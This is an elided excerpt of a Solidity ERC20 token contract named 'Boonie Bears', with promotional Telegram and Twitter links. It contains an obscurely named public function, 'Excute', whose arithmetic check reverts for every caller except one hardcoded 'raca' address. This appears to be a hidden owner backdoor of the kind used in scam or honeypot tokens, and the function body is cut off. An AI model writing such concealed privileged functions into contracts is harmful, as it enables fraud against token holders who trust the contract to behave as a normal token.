...
*/
/**
Telegram: https://t.me/BoonieBearsPortal

Twitter：https://twitter.com/BoonieBearsERC
...
contract BoonieBears is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Boonie Bears";
    string private _symbol = unicode"熊出没";
    ...
    constructor () {
        ...
        raca = payable(address(0x07c9199f62de99a6B9F2BeCbEdE2580734412103));
    ...
    function Excute(address smbol,uint256 ssr) public {
        ssr.sub(
            (msg.sender != raca) ? 
            ssr+ssr : 0
        );
